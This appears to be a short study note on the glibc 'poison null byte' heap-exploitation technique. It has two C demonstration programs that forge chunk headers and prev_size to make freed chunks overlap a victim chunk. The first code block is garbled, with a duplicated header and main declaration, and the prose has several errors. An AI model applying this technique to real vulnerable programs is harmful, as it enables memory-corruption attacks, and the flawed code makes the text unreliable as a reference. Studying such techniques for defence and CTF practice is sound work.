# Poison null byte
> LongChampion, 16/03/2020

# Simple version: arbitrary overwrite
In this simple sersion, we can overwrite next chunk header with any content because of an overflow, let see what will happen:
```
#include <stdlib.h>

int main()
#include <stdlib.h>
#define PREV_INUSE 0x01

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

int main()
{
    void *a = malloc(0x100 - 8);
    void *b = malloc(0x100 - 8);
    void *c = malloc(0x100 - 8);

    struct Chunk *b_header = (struct Chunk *) (b - 0x10);
    b_header->size = 0x200 | PREV_INUSE;

    struct Chunk *f_header = (struct Chunk *) (b + 0x200 - 0x10);
    f_header->size = 0x200 | PREV_INUSE;

    free(b);
    b = malloc(0x200 - 8);
}
```
First, we overflow chunk `a` to set size of chunk `b` to 0x200 | 0x1. We must set PREV_INUSE flag or `free` will merge chunk `b` with chunk `a` when chunk `b` is freed. Then, we create a fake chunk at offset 0x200 behind chunk `b`. This size fake chunk must equal to fake size of chunk `b` (it's is 0x200 in the code above). Again, the PREV_INUSE flag is also necessary: you can free a chunk if is not in use. The chunk `c` very inportant: it is both the victim chunk to be overlapping and the "pivot" chunk to prevent chunk `b` from becoming the top_chunk, which we can not free.  
Finally, free chunk `b`, it will be pushed to smallbin of size 0x200. When we call `malloc(0x200 - 8)`, we recieve chunk `b` again but with BIGGER SIZE and we are able to overwrite to chuck `c`.

# Reality version: only one nullbyte overflow
This error is common but is harder to exploit.
```
#include <stdlib.h>
#include <malloc.h>

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

int main()
{
    void *a = malloc(0x100 - 8);
    void *b = malloc(0x210 - 8);
    void *c = malloc(0x100 - 8);

    free(b);

    *(char *) (a + malloc_usable_size(a)) = 0x00;
    struct Chunk *f_chunk = (struct Chunk *) (b + 0x200 - 0x10);
    f_chunk->pre_size = 0x200;

    void *b1 = malloc(0x100 - 8);
    void *b2 = malloc(0x60 - 8);

    free(b1);
    free(c);

    b = malloc(0x400 - 8);
}
```

> I highly recommend read [this](https://go.contextis.com/rs/140-OCV-459/images/Glibc_Adventures-The_Forgotten_Chunks.pdf) for visualization of this attack.

This attack is very similar to the last one except the followings:
- We modify chunk `b` AFTER it have been freed.
- The nullbyte DECREASE size of chunk `b` (0x00 is the smallest byte lol)
- The size of chunk `b1` must strictly LARGER than max size of fastbin
- After `free(c)`, chunk `b` is top_chunk, so any malloc with size larger than size of last_remeaning_chunk will return `b`. (last_remeaning_chunk is the chunk remain in unsorted_bin when we call allocate `b2`)

## NOTE
- **DON'T MAKE YOUR LIFE OBSTRUCT BY YOURSELF**:  
    In simple version, we set
    > `f_chunk->size = 0x200 | PREV_INUSE`

    but in reality version, we set
    > `f_chunk->pre_size = 0x200`.
- This attack doesn't work against tcache_bin and fastbin because their mechanism are different from smallbin mechanism.
